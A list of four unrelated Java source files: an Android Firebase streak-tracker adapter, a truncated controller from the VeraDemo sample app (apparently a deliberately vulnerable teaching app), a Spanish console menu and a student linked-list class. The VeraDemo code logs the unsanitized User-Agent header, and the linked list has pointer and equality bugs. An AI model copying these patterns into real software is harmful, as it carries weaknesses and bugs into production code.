    "package com.example.streaking.fortaskrecycler;\n\nimport android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.provider.ContactsContract;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.Adapter;\nimport android.widget.Button;\nimport android.widget.ImageView;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport com.example.streaking.R;\nimport com.example.streaking.ui.MainActivity;\nimport com.firebase.ui.database.FirebaseRecyclerAdapter;\nimport com.firebase.ui.database.FirebaseRecyclerOptions;\nimport com.google.firebase.database.DatabaseReference;\nimport com.google.firebase.database.FirebaseDatabase;\n\nimport java.text.SimpleDateFormat;\nimport java.time.LocalDate;\nimport java.time.format.DateTimeFormatter;\nimport java.util.ArrayList;\nimport java.sql.Date;\nimport java.util.Locale;\n\npublic class TaskAdapter extends RecyclerView.Adapter<TaskViewHolder> {\n    ArrayList<TaskModel> taskModelArrayList;\n    public TaskAdapter(ArrayList<TaskModel> taskModelArrayList) {\n        this.taskModelArrayList = taskModelArrayList;\n    }\n\n    @NonNull\n    @Override\n    public TaskViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        View view= LayoutInflater.from(parent.getContext()).inflate(R.layout.taskrecycler, parent, false);\n        return new TaskViewHolder(view);\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull TaskViewHolder holder, int position) {\n\n        TaskModel taskModel=taskModelArrayList.get(position);\n        holder.taskName.setText(taskModel.getTaskName());\n        holder.streakCount.setText(String.valueOf(taskModel.getStreakCount()));\n        String lastLogin=taskModel.getLastLogin();\n        long millis=System.currentTimeMillis();\n        String currDate=(new Date(millis)).toString();\n//        int lastDate=Integer.parseInt(lastLogin.substring(lastLogin.length()-2));\n//        int curr=Integer.parseInt(currDate.substring(currDate.length()-2));\n        LocalDate date1 = LocalDate.parse(lastLogin, DateTimeFormatter.ISO_LOCAL_DATE);\n        LocalDate date2 = LocalDate.parse(currDate, DateTimeFormatter.ISO_LOCAL_DATE);\n        if(!date1.equals(date2)){\n            DatabaseReference databaseReference= FirebaseDatabase.getInstance().getReference().child(\"Tasks\").child(taskModel.getTaskName());\n            if(date1.plusDays(1).equals(date2)){\n                if(taskModel.isStreakIcon()){\n                    databaseReference.child(\"streakIcon\").setValue(false);\n                }else{\n                    databaseReference.child(\"streakCount\").setValue(0);\n                }\n            }else{\n                databaseReference.child(\"streakCount\").setValue(0);\n                databaseReference.child(\"streakIcon\").setValue(false);\n            }\n            databaseReference.child(\"lastLogin\").setValue(currDate);\n        }\n        if(taskModel.isStreakIcon()){\n            holder.streakIcon.setImageResource(R.drawable.on_fire);\n        }else{\n            holder.streakIcon.setImageResource(R.drawable.off_fire);\n        }\n\n        holder.remove.setOnClickListener(v->{\n            DatabaseReference databaseReference= FirebaseDatabase.getInstance().getReference().child(\"Tasks\").child(taskModel.getTaskName());\n            databaseReference.removeValue();\n        });\n\n        holder.streakIcon.setOnClickListener(v->{\n            DatabaseReference databaseReference= FirebaseDatabase.getInstance().getReference().child(\"Tasks\").child(taskModel.getTaskName());\n            int setCount=taskModel.getStreakCount();\n            if(!taskModel.isStreakIcon()){\n                databaseReference.child(\"streakIcon\").setValue(true);\n                setCount+=1;\n                databaseReference.child(\"streakCount\").setValue(setCount);\n            }else{\n                databaseReference.child(\"streakIcon\").setValue(false);\n                setCount-=1;\n                databaseReference.child(\"streakCount\").setValue(setCount);\n            }\n        });\n\n\n    }\n\n\n    @Override\n    public int getItemCount() {\n        return taskModelArrayList.size();\n    }\n\n\n\n}\n",
    "package com.veracode.verademo.controller;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Timestamp;\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport javax.servlet.http.HttpServletRequest;\n\nimport com.veracode.verademo.commands.BlabberCommand;\nimport com.veracode.verademo.model.Blab;\nimport com.veracode.verademo.model.Blabber;\nimport com.veracode.verademo.model.Comment;\nimport com.veracode.verademo.utils.Constants;\nimport com.veracode.verademo.utils.Utils;\n\nimport org.apache.log4j.LogManager;\nimport org.apache.log4j.Logger;\nimport org.springframework.context.annotation.Scope;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\n@Scope(\"request\")\npublic class BlabController {\n\tprivate static final Logger logger = LogManager.getLogger(\"VeraDemo:BlabController\");\n\n\tprivate final String sqlBlabsByMe = \"SELECT blabs.content, blabs.timestamp, COUNT(comments.blabber), blabs.blabid \"\n\t\t\t+ \"FROM blabs LEFT JOIN comments ON blabs.blabid = comments.blabid \"\n\t\t\t+ \"WHERE blabs.blabber = ? GROUP BY blabs.blabid ORDER BY blabs.timestamp DESC;\";\n\n\tprivate final String sqlBlabsForMe = \"SELECT users.username, users.blab_name, blabs.content, blabs.timestamp, COUNT(comments.blabber), blabs.blabid \"\n\t\t\t+ \"FROM blabs INNER JOIN users ON blabs.blabber = users.username INNER JOIN listeners ON blabs.blabber = listeners.blabber \"\n\t\t\t+ \"LEFT JOIN comments ON blabs.blabid = comments.blabid WHERE listeners.listener = ? \"\n\t\t\t+ \"GROUP BY blabs.blabid ORDER BY blabs.timestamp DESC LIMIT %d OFFSET %d;\";\n\n\t@RequestMapping(value = \"/feed\", method = RequestMethod.GET)\n\tpublic String showFeed(\n\t\t\t@RequestParam(value = \"type\", required = false) String type,\n\t\t\tModel model,\n\t\t\tHttpServletRequest httpRequest) {\n\t\tlogger.info(\"Entering showFeed\");\n\n\t\tString username = (String) httpRequest.getSession().getAttribute(\"username\");\n\t\t// Ensure user is logged in\n\t\tif (username == null) {\n\t\t\tlogger.info(\"User is not Logged In - redirecting...\");\n\t\t\treturn Utils.redirect(\"login?target=profile\");\n\t\t}\n\n\t\tlogger.info(\"User is Logged In - continuing... UA=\" + httpRequest.getHeader(\"User-Agent\") + \" U=\" + username);\n\n\t\tConnection connect = null;\n\t\tPreparedStatement blabsByMe = null;\n\t\tPreparedStatement blabsForMe = null;\n\n\t\ttry {\n\t\t\tlogger.info(\"Getting Database connection\");\n\t\t\tClass.forName(\"com.mysql.jdbc.Driver\");\n\t\t\tconnect = DriverManager.getConnection(Constants.create().getJdbcConnectionString());\n\n\t\t\t// Find the Blabs that this user listens to\n\t\t\tlogger.info(\"Preparing the BlabsForMe Prepared Statement\");\n\t\t\tblabsForMe = connect.prepareStatement(String.format(sqlBlabsForMe, 10, 0));\n\t\t\tblabsForMe.setString(1, username);\n\t\t\tlogger.info(\"Executing the BlabsForMe Prepared Statement\");\n\t\t\tResultSet blabsForMeResults = blabsForMe.executeQuery();\n\n\t\t\t// Store them in the Model\n\t\t\tList<Blab> feedBlabs = new ArrayList<Blab>();\n\t\t\twhile (blabsForMeResults.next()) {\n\t\t\t\tBlabber author = new Blabber();\n\t\t\t\tauthor.setUsername(blabsForMeResults.getString(1));\n\t\t\t\tauthor.setBlabName(blabsForMeResults.getString(2));\n\n\t\t\t\tBlab post = new Blab();\n\t\t\t\tpost.setId(blabsForMeResults.getInt(6));\n\t\t\t\tpost.setContent(blabsForMeResults.getString(3));\n\t\t\t\tpost.setPostDate(blabsForMeResults.getDate(4));\n\t\t\t\tpost.setCommentCount(blabsForMeResults.getInt(5));\n\t\t\t\tpost.setAuthor(author);\n\n\t\t\t\tfeedBlabs.add(post);\n\t\t\t}\n\t\t\tmodel.addAttribute(\"blabsByOthers\", feedBlabs);\n\t\t\tmodel.addAttribute(\"currentUser\", username);\n\n\t\t\t// Find the Blabs by this user\n\t\t\tlogger.info(\"Preparing the BlabsByMe Prepared Statement\");\n\t\t\tblabsByMe = connect.prepareStatement(sqlBlabsByMe);\n\t\t\tblabsByMe.setString(1, username);\n\t\t\tlogger.info(\"Executing the BlabsByMe Prepared Statement\");\n\t\t\tResultSet blabsByMeResults = blabsByMe.executeQuery();\n\n\t\t\t// Store them in the model\n\t\t\tList<Blab> myBlabs = new ArrayList<Blab>();\n\t\t\twhile (blabsByMeResults.next()) {\n\t\t\t\tBlab post = new Blab();\n\t\t\t\tpost.setId(blabsByMeResults.getInt(4));\n\t\t\t\tpost.setContent(blabsByMeResults.getString(1));\n\t\t\t\tpost.setPostDate(blabsByMeResults.getDate(2));\n\t\t\t\tpost.setCommentCount(blabsByMeResults.getInt(3));\n\n\t\t\t\tmyBlabs.add(post);\n\t\t\t}\n\t\t\tmodel.addAttribute(\"blabsByMe\", myBlabs);\n\t\t} catch (SQLException | ClassNotFoundException ex) {\n\t\t\tlogger.error(ex);\n\t\t} finally {\n\t\t\ttry {\n\t\t\t\tif (blabsByMe != null) {\n\t\t\t\t\tblabsByMe.close();\n\t\t\t\t}\n\t\t\t} catch (SQLException exceptSql) {\n\t\t\t\tlogger.error(exceptSql);\n\t\t\t}\n\t\t\ttry {\n\t\t\t\tif (blabsForMe != null) {\n\t\t\t\t\tblabsForMe.close();\n\t\t\t\t}\n\t\t\t} catch (SQLException exceptSql) {\n\t\t\t\tlogger.error(exceptSql);\n\t\t\t}\n\t\t\ttry {\n\t\t\t\tif (conne",
    "import java.util.Scanner;\n\npublic class menu {\n    static Scanner scanner = new Scanner(System.in);\n\n    public static void menuPrincipal() {\n        int goku;\n\n        do {\n            System.out.println(\"\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\");\n            System.out.println(\"                                  Men\u00fa                                   \");\n            System.out.println(\"                                                                         \");\n            System.out.println(\"Ingrese un numero.......................................................1\");\n            System.out.println(\"Salir ..................................................................2\");\n            System.out.println(\"                                                                         \");\n            System.out.println(\"\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\");\n            System.out.print(\"Elija opci\u00f3n: \");\n\n            goku = scanner.nextInt();\n\n            switch (goku) {\n                case 1:\n                    recursividad.aaa();\n                    break;\n\n                case 2:\n                    System.out.println(\"Fin del programa.\");\n                    break;\n                default:\n                    System.out.println(\"Opci\u00f3n no v\u00e1lida. Por favor, ingrese una opci\u00f3n v\u00e1lida (1-5).\");\n            }\n        } while (goku != 2);\n\n        scanner.close();\n    }\n}\n\n",
    "package datastr;\n\nimport java.lang.reflect.Array;\nimport java.util.ArrayList;\n\npublic class MyLinkedList<Ttype> {\n\tprivate MyListNode first = null;\n\tprivate MyListNode last = null;\n\tprivate int counter = 0;\n\t\n\t//p\u0113c noklusejuma jau ir bezargumenta konstruktors -> MyLinkedList()\n\t\n\tpublic boolean isEmpty()\n\t{\n\t\treturn (counter==0);\n\t}\n\t\n\t//TODO padom\u0101t un izveidot isFull() funkciju\n\t\n\tpublic int howManyElements()\n\t{\n\t\treturn counter;\n\t}\n\t\n\tpublic void add(Ttype element) throws Exception {\n\t\tif(element == null) throw new Exception(\"Problems with element\");\n\t\t\n\t\t\n\t\t//TODO izsaukt isFull()\n\t\t\n\t\tif(isEmpty())\n\t\t{\n\t\t\tMyListNode newNode = new MyListNode(element);\n\t\t\tfirst  = newNode;\n\t\t\tlast = newNode;\n\t\t\tcounter++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tMyListNode newNode = new MyListNode(element);\n\t\t\tnewNode.setPrevious(last);\n\t\t\tlast.setNext(newNode);\n\t\t\tlast = newNode;\n\t\t\tcounter++;\n\t\t}\n\t}\n\n\tpublic void add(Ttype element, int pos) throws Exception {\n\t\tif (element == null) throw new Exception(\"Problems with element\");\n\t\tif (pos > counter || pos < 0) throw new Exception(\"Problems with pos\");\n\n\t\tif (isEmpty() && pos == 0) {\n            add(element);\n\t\t} else if (isEmpty() && pos != 0)  {\n\t\t\tthrow new Exception(\"Problems with pos\");\n\t\t} else if (pos == 0) {\n\t\t\tMyListNode newNode = new MyListNode<>(element);\n\t\t\tnewNode.setNext(first);\n\t\t\tfirst.setPrevious(newNode);\n\t\t\tfirst = newNode;\n\t\t\tcounter++;\n\t\t} else if (pos == counter) {\n\t\t\tadd(element);\n\t\t} else {\n\t\t\tMyListNode temp = first;\n\t\t\tfor (int i = 0; i < pos; i++) {\n\t\t\t\ttemp = temp.getNext();\n\t\t\t}\n\t\t\tMyListNode rightNode = temp;\n\t\t\tMyListNode leftNode = temp.getPrevious();\n\t\t\tMyListNode newNode = new MyListNode(element);\n\n\t\t\tnewNode.setNext(rightNode);\n\t\t\trightNode.setPrevious(newNode);\n\t\t\tnewNode.setPrevious(leftNode);\n\t\t\tleftNode.setNext(newNode);\n\n\t\t\tcounter++;\n\n\t\t}\n\t}\n\n\tpublic void delete(int pos) throws Exception {\n\t\tif (isEmpty()) throw new Exception(\"There are no elements in list\");\n\t\tif (pos >= counter || pos < 0) throw new Exception(\"Problems with pos\");\n\n\t\tif (pos == 0) {\n\t\t\tfirst = first.getNext();\n\t\t\tfirst.setPrevious(null);\n\t\t\tcounter--;\n\t\t\tSystem.gc();\n\t\t} else if (pos == counter - 1) {\n\t\t\tlast = last.getPrevious();\n\t\t\tlast.setNext(null);\n\t\t\tcounter--;\n\t\t\tSystem.gc();\n\t\t} else {\n\t\t\tMyListNode temp = first;\n\n\t\t\tfor (int i = 0; i < pos; i++) {\n\t\t\t\ttemp = temp.getNext();\n\t\t\t}\n\n\t\t\tMyListNode leftNode = temp.getPrevious();\n\n\t\t\tleftNode.setNext(temp.getNext());\n\t\t\tcounter--;\n\t\t\tSystem.gc();\n\t\t}\n\t}\n\n\tpublic ArrayList<Integer> search(Ttype element) throws Exception {\n\t\tif (isEmpty()) throw new Exception(\"There are no elements in list\");\n\t\tif (element == null) throw new Exception(\"Problems with element\");\n\n\t\tArrayList<Integer> result = new ArrayList<>();\n\t\tMyListNode temp = first;\n\n\t\tfor (int i = 0; i < counter; i++) {\n\t\t\tif (temp.getElement() == element) {\n\t\t\t\tresult.add(i);\n\t\t\t}\n\t\t\ttemp = temp.getNext();\n\t\t}\n\n\t\tif (result.isEmpty()) throw new Exception(\"There is no \" + element + \" in list\");\n\n\t\treturn result;\n\t}\n\n\tpublic void makeEmpty() throws Exception {\n\t\tif (isEmpty()) throw new Exception(\"List is already empty\");\n\t\tfirst = null;\n\t\tlast = null;\n\t\tcounter = 0;\n\t\tSystem.gc();\n\t}\n\n\tpublic Ttype get(int pos) throws Exception {\n\t\tif (isEmpty()) throw new Exception(\"There are no elements in list\");\n\t\tif (pos >= counter || pos < 0) throw new Exception(\"Problems with pos\");\n\n\t\tMyListNode temp = first;\n\n\t\tfor (int i = 0; i < pos; i++) {\n\t\t\ttemp = temp.getNext();\n\t\t}\n\n\t\treturn (Ttype) temp.getElement();\n\t}\n\t\n\tpublic void print() throws Exception\n\t{\n\t\tif(isEmpty()) throw new Exception(\"List is empty\");\n\t\t\n\t\t\n\t\tMyListNode temp = first;\n\t\t\n\t\tfor(int i = 0 ; i < counter; i++) {\n\t\t\tSystem.out.print(temp + \" \");\n\t\t\ttemp = temp.getNext();\n\t\t}\n\t\tSystem.out.println();\n\t}\n\t\n\t\n\t\n\t\n\t\n\t\n\n}\n"
]